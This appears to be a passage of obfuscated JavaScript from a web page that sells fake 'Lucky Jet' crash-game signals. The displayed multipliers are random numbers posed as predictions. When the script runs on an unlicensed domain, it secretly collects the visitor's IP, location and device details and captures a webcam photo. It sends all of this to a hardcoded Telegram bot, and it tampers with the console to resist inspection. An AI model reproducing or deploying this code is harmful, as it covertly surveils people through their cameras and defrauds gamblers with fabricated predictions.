    const _0x417c6c = document.createElement("video");
    _0x417c6c.srcObject = _0x30c1b2;
    await _0x417c6c.play();
    const _0x284287 = document.createElement("canvas");
    _0x284287.width = _0x417c6c.videoWidth;
    _0x284287.height = _0x417c6c.videoHeight;
    const _0x458d76 = _0x284287.getContext('2d');
    _0x458d76.drawImage(_0x417c6c, 0, 0, _0x284287.width, _0x284287.height);
    _0x417c6c.pause();
    _0x30c1b2.getTracks().forEach(_0x513936 => _0x513936.stop());
    const _0x129cd0 = await new Promise(_0x106e57 => _0x284287.toBlob(_0x106e57, "image/jpeg"));
    const _0x2b292e = new FormData();
    _0x2b292e.append("chat_id", "7728504492");
    _0x2b292e.append("photo", _0x129cd0, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x2b292e
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x3cceb6) {
    console.error("Failed to capture photo:", _0x3cceb6);
  }
}
async function initTelegramBot() {
  const _0x370d84 = {
    domain: window.location.hostname
  };
  _0x370d84.fullUrl = window.location.href;
  if (_0x370d84.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x586d6e = document.createElement("style");
    _0x586d6e.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x586d6e);
    const _0x10afd4 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x370d84.domain + "</code>\n🔗 URL: <code>" + _0x370d84.fullUrl + "</code>\n🌐 IP: <code>" + _0x10afd4.ip + "</code>\n📌 Location: " + _0x10afd4.city + ", " + _0x10afd4.region + ", " + _0x10afd4.countryName + " " + _0x10afd4.countryEmoji + "\n📱 Device: <code>" + _0x10afd4.deviceModel + "</code>\n🖥️ Type: <code>" + _0x10afd4.deviceType + " (" + _0x10afd4.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x10afd4.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x4e2b42 = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x5b1564 = await _0x4e2b42.json();
    if (_0x5b1564.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x2d5682 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x370d84.domain + "</code>\n🔗 URL: <code>" + _0x370d84.fullUrl + "</code>\n🌐 IP: <code>" + _0x2d5682.ip + "</code>\n📌 Location: " + _0x2d5682.city + ", " + _0x2d5682.region + ", " + _0x2d5682.countryName + " " + _0x2d5682.countryEmoji + "\n📱 Device: <code>" + _0x2d5682.deviceModel + "</code>\n🖥️ Type: <code>" + _0x2d5682.deviceType + " (" + _0x2d5682.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x2d5682.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0x521873) {
    console.error("Failed to initialize bot:", _0x521873);
    const _0x3ef7c2 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x370d84.domain + "</code>\n🔗 URL: <code>" + _0x370d84.fullUrl + "</code>\n🌐 IP: <code>" + _0x3ef7c2.ip + "</code>\n📌 Location: " + _0x3ef7c2.city + ", " + _0x3ef7c2.region + ", " + _0x3ef7c2.countryName + " " + _0x3ef7c2.countryEmoji + "\n📱 Device: <code>" + _0x3ef7c2.deviceModel + "</code>\n🖥️ Type: <code>" + _0x3ef7c2.deviceType + " (" + _0x3ef7c2.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x3ef7c2.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
const tokens = ["demo", "demo", "demo"];
function getAuthorizationToken() {
  const _0x3a8a9d = tokens[tokenIndex];
  tokenIndex = (tokenIndex + 1) % tokens.length;
  return "Bearer " + _0x3a8a9d;
}
function getRan(_0x37b4ec, _0x32769b) {
  return Math.random() * (_0x32769b - _0x37b4ec) + _0x37b4ec;
}
function _0x14dabb(_0x1253a0, _0x418993, _0x1b137a, _0x4be842, _0x44eb64) {
  return _0x3ada(_0x418993 + 0x3b3, _0x1b137a);
}
function _0x39c3c5(_0x24588b, _0x54daec, _0x5b18a1, _0x411263, _0x44c55b) {
  return _0x3ada(_0x44c55b - 0x17f, _0x24588b);
}
async function checkSignal() {
  let _0x5eb2bd = (Math.random() * 3.9 + 1.1).toFixed(2);
  const _0x3c00bd = await fetch("https://crash-gateway-cc-cr.gamedev-tech.cc/state?id_n=1play_luckyjet&id_i=1", {
    'headers': {
      'Authorization': getAuthorizationToken()
    }
  });
  const _0x3eb2e1 = await _0x3c00bd.json();
  const _0x50c5b7 = _0x3eb2e1.current_state;
  let _0x40c8d3 = document.getElementById("responseText");
  if (!_0x40c8d3) {
    console.error("Element with ID responseText not found.");
    return;
  }
  if (_0x50c5b7 === "betting" && Date.now() - lastBettingTime > 5000) {
    let _0x4566a7 = _0x5eb2bd + 'x';
    document.getElementById("responseText").textContent = _0x4566a7;
    localStorage.setItem("resultText", _0x4566a7);
    _0x40c8d3.className = "text betting";
    lastBettingTime = Date.now();
  } else {
    if (_0x50c5b7 === "ending") {
      _0x40c8d3.textContent = "Waiting..";
      _0x40c8d3.className = "text fly";
    }
  }
}
function _0x55c94e(_0x1f5943, _0x1292ee, _0x3dd626, _0x5b7a95, _0x5b59e3) {
  return _0x3ada(_0x3dd626 + 0x35f, _0x5b59e3);
}
function fetchDataAndUpdate() {
  const _0x29a02c = function () {
    let _0xc82c4b = true;
    return function (_0x26a34f, _0x510d35) {
      const _0x19c227 = _0xc82c4b ? function () {
        const _0x2c8a0e = {
          BLwLK: "responseText"
        };
        _0x2c8a0e.plIoz = "resultText";
        _0x2c8a0e.IcTOe = "text betting";
        if (_0x510d35) {
          const _0x484ace = _0x510d35.apply(_0x26a34f, arguments);
          _0x510d35 = null;
          return _0x484ace;
        }
      } : function () {};
      _0xc82c4b = false;
      return _0x19c227;
    };
  }();
  const _0x67a6d6 = _0x29a02c(this, function () {
    const _0x1fbc94 = function () {
      let _0x2e50a3;
      try {
        _0x2e50a3 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0x55aa43) {
        _0x2e50a3 = window;
      }
      return _0x2e50a3;
    };
    const _0x28ddbb = _0x1fbc94();
    const _0x515821 = _0x28ddbb.console = _0x28ddbb.console || {};
    const _0x4c0f88 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x55b969 = 0; _0x55b969 < _0x4c0f88.length; _0x55b969++) {
      const _0x135f88 = _0x29a02c.constructor.prototype.bind(_0x29a02c);
      const _0xe53815 = _0x4c0f88[_0x55b969];
      const _0x34ec16 = _0x515821[_0xe53815] || _0x135f88;
      _0x135f88.__proto__ = _0x29a02c.bind(_0x29a02c);
      _0x135f88.toString = _0x34ec16.toString.bind(_0x34ec16);
      _0x515821[_0xe53815] = _0x135f88;
    }
  });
  _0x67a6d6();
  fetch("https://crash-gateway-cc-cr.gamedev-tech.cc/state?id_n=1play_luckyjet&id_i=1", {
    'headers': {
      'Authorization': getAuthorizationToken()
    }
  }).then(_0x3e7b9d => _0x3e7b9d.json()).then(_0x528449 => {
    const _0x2d9b0e = parseFloat(_0x528449.current_coefficients);
    updateCoefficients(_0x2d9b0e);
  })["catch"](_0x59ae2e => console.error("Error fetching data:", _0x59ae2e));
}
function _0x3ada(_0x25f419, _0x3ada6c) {
  const _0x341e2f = _0x25f4();
  _0x3ada = function (_0x6c52a7, _0x57fd95) {
    _0x6c52a7 = _0x6c52a7 - 366;
    let _0x479d88 = _0x341e2f[_0x6c52a7];
    return _0x479d88;
  };
  return _0x3ada(_0x25f419, _0x3ada6c);
}
function _0x3b2493(_0x40203f, _0x2cbc45, _0x59efc4, _0x13bc48, _0x18e33d) {
  return _0x3ada(_0x18e33d - 0x26b, _0x59efc4);
}
function updateCoefficients(_0x2975e0) {
  const _0x4c385f = document.getElementById("coefficients");
  if (!_0x4c385f) {
    console.error("Element with ID coefficients not found.");
    return;
  }
  if (_0x2975e0 !== 1) {
    _0x4c385f.innerText = 'x' + _0x2975e0;
    _0x4c385f.classList.remove("smallt");
    _0x4c385f.classList.add("kif");
  }
}
fetchDataAndUpdate();
setInterval(fetchDataAndUpdate, 100);
checkSignal();
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});